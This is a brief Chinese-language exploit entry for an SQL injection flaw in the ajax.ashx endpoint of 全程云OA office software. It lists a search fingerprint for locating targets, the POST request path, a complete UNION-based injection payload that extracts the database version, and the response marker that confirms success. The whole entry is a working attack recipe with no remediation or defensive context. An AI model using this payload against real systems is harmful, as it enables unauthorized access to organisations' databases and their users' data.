# 全程云OAajax.ashxSQL注入漏洞

全程云OAajax.ashx ｜ SQL注入 ｜ —
- **指纹**：`"全程云OA"`
- **请求**：`POST /OA/common/mod/ajax.ashx HTTP/1.1`

**Payload**
```
dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+
```
- **响应特征**：200 PK_ID